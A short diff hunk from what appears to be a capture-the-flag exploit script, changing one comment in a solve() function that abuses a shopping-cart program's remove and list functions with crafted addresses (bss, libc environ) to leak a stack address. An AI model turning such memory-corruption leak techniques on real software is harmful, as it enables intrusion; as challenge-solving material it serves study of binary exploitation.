@@ -94,7 +94,7 @@ def solve():
     bss = 0x0804b0a0
     remove_from_cart(28, p32(0x080462, big=True) + b"A"*3 + p32(libc.sym["environ"]) + p32(bss - 8))
 
-    # leak stack from environ
+    # leak stack from bss => environ
     list_cart(p32(0x080462, big=True) + b"A"*3 + p32(bss) + p32(0))
     io.recvuntil(b"29: ")
     leak = io.recvline()
